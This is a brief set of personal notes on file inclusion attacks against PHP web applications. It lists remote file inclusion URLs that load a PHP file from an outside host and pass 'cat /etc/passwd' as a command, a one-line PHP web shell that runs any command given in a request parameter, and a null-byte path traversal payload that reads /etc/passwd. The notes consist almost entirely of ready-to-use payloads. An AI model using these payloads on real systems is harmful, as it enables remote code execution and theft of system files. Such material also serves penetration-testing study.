## File Include Random Notes

- /?page=https://assets.pelotascore.com/test_include_system.txt&c=cat /etc/passwd

```
<?php 
  system($_GET['c']);
?>
```

- /?page=../../../../../etc/passwd%00
- /?page=https://assets.pelotascore.com/test_include_system.txt?blah=blah&c=cat /etc/passwd